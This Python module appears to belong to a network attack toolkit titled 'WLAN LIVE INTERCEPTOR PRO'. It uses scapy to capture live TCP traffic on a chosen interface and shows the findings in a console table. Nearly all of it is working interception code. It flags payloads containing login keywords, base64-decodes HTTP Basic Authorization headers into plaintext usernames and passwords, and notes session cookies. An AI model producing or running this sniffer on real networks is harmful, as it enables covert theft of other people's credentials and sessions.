import re
import os
import base64
from datetime import datetime
from scapy.all import sniff, IP, TCP, UDP, conf, Raw
from rich.console import Console
from rich.table import Table
from rich.live import Live
from core.ui import draw_header

console = Console()
captured_intel = []


def parse_http_intel(load):
    """Deep inspection of HTTP traffic for secrets and tech-stack info."""
    decoded = load.decode('utf-8', errors='ignore')
    intel = []

    # Check for Authorization headers
    auth_match = re.search(r"Authorization: Basic (.*)", decoded)
    if auth_match:
        try:
            creds = base64.b64decode(auth_match.group(1)).decode()
            intel.append(f"[BOLD RED]BASIC AUTH: {creds}[/BOLD RED]")
        except:
            pass

    # Detect Cookies and User-Agents
    if "Cookie:" in decoded:
        intel.append("[yellow]Session Cookie Found[/yellow]")
    if "User-Agent:" in decoded:
        ua = re.search(r"User-Agent: (.*)", decoded)
        if ua:
            intel.append(f"[dim]UA: {ua.group(1)[:30]}...[/dim]")

    return intel


def packet_callback(packet):
    if not packet.haslayer(IP) or not packet.haslayer(TCP):
        return

    src, dst = packet[IP].src, packet[IP].dst
    port = packet[TCP].dport
    info = []

    if packet.haslayer(Raw):
        load = packet[Raw].load
        # Hunt for plain-text patterns
        if any(kw in load.lower() for kw in [b"user", b"pass", b"login"]):
            info.append(
                "[bold red]Potential Credentials In Payload[/bold red]")

        # HTTP specific intel
        if port in [80, 8080]:
            info.extend(parse_http_intel(load))

    if info:
        timestamp = datetime.now().strftime("%H:%M:%S")
        captured_intel.append({
            "time": timestamp, "src": src, "dst": f"{dst}:{port}", "intel": " | ".join(info)
        })


def generate_intel_table():
    table = Table(title="Live Intelligence Stream",
                  expand=True, border_style="cyan")
    table.add_column("Time", style="dim")
    table.add_column("Source", style="green")
    table.add_column("Target", style="magenta")
    table.add_column("Intercepted Intel", style="white")

    for entry in captured_intel[-10:]:
        table.add_row(entry["time"], entry["src"],
                      entry["dst"], entry["intel"])
    return table


def start_sniffing():
    draw_header("WLAN LIVE INTERCEPTOR PRO")
    ifaces = [i.name for i in conf.ifaces.data.values()]
    console.print(
        f"[blue][*] Available Interfaces: {', '.join(ifaces)}[/blue]")
    iface = console.input(
        "[bold yellow]Select Interface: [/bold yellow]").strip()

    if not iface:
        return

    try:
        with Live(generate_intel_table(), refresh_per_second=1) as live:
            def wrapped_cb(pkt):
                packet_callback(pkt)
                live.update(generate_intel_table())

            sniff(iface=iface, prn=wrapped_cb, store=False, filter="tcp")
    except KeyboardInterrupt:
        console.print("\n[yellow][!] Sniffing Halted.[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
